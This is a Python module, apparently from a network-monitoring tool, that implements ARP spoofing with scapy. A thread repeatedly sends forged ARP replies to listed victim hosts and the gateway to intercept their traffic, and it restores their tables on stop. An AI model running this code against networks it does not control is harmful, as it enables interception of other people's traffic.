import time
import threading
import logging
import scapy.all as sc
from src.utils.utils import get_mac, disable_if_offline

class ARP_spoofer:
    def __init__(self, host_state):
        self.host_state = host_state
        self.lock = threading.Lock()
        self._active = False
        self._thread = threading.Thread(target=self.arp_spoof_loop)
        # make it a daemon so that it stops when the host state stops
        self._thread.daemon = True

        # ARP parameters
        self.victim_ip_list = []
        self.gateway_mac = None
        self.has_spoofed = False
    
    # Do not start the ARP spoofer if offline
    @disable_if_offline
    def start(self):
        """starts the ARP spoofing thread. To be called by host state"""
        with self.lock:
            self._active = True
        logging.info("[ARP spoofer] ARP spoofing starting")
        self._thread.start()

    @disable_if_offline
    def stop(self):
        """stops the ARP spoofing thread, to be called by host state to end the thread"""
        logging.info("[ARP spoofer] ARP spoofing stopping")
        with self.lock:
            self._active = False
        if self.has_spoofed:
            self.arp_restore_all()
        self._thread.join()
        return

    @disable_if_offline
    def arp_spoof(self, mac_gateway, mac_victim, ip_gateway, ip_victim, mac_host):
        """Sends 2 spoofing ARP packets"""
        #trick gateway
        sc.send(sc.ARP(op=2, pdst=ip_gateway, hwdst=mac_gateway, psrc=ip_victim, hwsrc=mac_host), verbose=False)
        # trick victim
        sc.send(sc.ARP(op=2, pdst=ip_victim, hwdst=mac_victim, psrc=ip_gateway, hwsrc=mac_host), verbose=False)
    
    @disable_if_offline
    def arp_restore_victim(self, ip_victim):
        """Restores ARP for a victim"""
        ip_to_mac = self.host_state.get_arp_table()
        mac_victim = ip_to_mac[ip_victim]
        with self.host_state.lock:
            ip_gateway = self.host_state.gateway_ip
            mac_gateway = ip_to_mac[self.host_state.gateway_ip]
            sc.send(sc.ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_gateway, hwsrc=mac_victim, psrc=ip_victim), verbose=False)
            sc.send(sc.ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_victim, hwsrc=mac_gateway, psrc=ip_gateway), verbose=False)

    @disable_if_offline
    def arp_restore_all(self):
        """Restores ARP table by sending ARP packets with the real MAC addresses to end ARP spoofing"""
        for ip_victim in self.victim_ip_list:
            self.arp_restore_victim(ip_victim)


    @disable_if_offline
    def arp_spoof_loop(self):
        """At each iteration obtains MAC addresses of targeted IPs and spoof their ARP tables"""
        while True:
            # logging.debug("[ARP spoofer] New iteration: check if active")
            with self.lock:
                #check if the thread has to stop
                if not self._active:
                    # if no longer active, return and end the process
                    return

            # logging.debug("[ARP spoofer] Obtaining the ARP table")
            with self.host_state.lock:
                if self.host_state.gateway_ip is None:
                    logging.error("[ARP spoofer] Gateway IP is not set")
                    return
                gateway_ip = self.host_state.gateway_ip
                if self.gateway_mac is None:
                    self.gateway_mac = get_mac(self.host_state.gateway_ip)
            gateway_mac = self.gateway_mac
            self.host_state.set_arp_table(gateway_ip, gateway_mac)

            ip_to_mac = self.host_state.get_arp_table()

            # logging.debug("[ARP spoofer] Victims to spoof: %s" , self.victim_ip_list)
            for victim_ip in self.victim_ip_list:
                if victim_ip in ip_to_mac:
                    victim_mac = ip_to_mac[victim_ip]
                else:
                    logging.debug("[ARP spoofer] obtaining MAC of %s", victim_ip)
                    mac = get_mac(victim_ip)
                    if mac is not None:
                        self.host_state.set_arp_table(victim_ip, mac)
                        victim_mac = mac
                    else:
                        logging.warning("[ARP spoofer] Could not obtain MAC of %s, not spoofing this host", victim_ip)
                        continue
                # logging.debug("[ARP spoofer] Sending ARP spoofing packets to %s", victim_ip)
                mac_host = self.host_state.host_mac
                self.arp_spoof(gateway_mac, victim_mac, gateway_ip, victim_ip, mac_host)
                self.has_spoofed = True

            # wait between 2 spoofing packets
            time.sleep(2)

if __name__ == "__main__":
    ip_target = "192.168.1.46"
    packet = sc.ARP(op = 1, hwdst = "ff:ff:ff:ff:ff:ff", pdst = ip_target)
    ans = sc.sr1(packet, timeout=10, verbose=True)
    for r in ans:
        print(r[sc.ARP].hwsrc)